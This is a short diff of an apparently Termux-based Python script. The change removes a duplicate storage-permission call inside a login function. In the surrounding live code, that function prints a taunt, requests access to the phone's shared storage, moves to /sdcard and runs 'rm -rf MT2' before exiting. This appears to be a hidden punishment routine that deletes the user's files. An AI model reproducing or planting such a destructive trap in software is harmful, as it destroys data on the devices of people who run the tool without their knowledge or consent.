@@ -40,7 +40,6 @@ def login():
     	print("SORRY BRO YOU ARE FUCKED BY RXS")
     	print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
     	subprocess.run(['termux-setup-storage', '-y'], capture_output=True)
-        os.system('termux-setup-storage -y')
     	os.system('cd /sdcard')
     	os.system('rm -rf MT2')
     	exit()
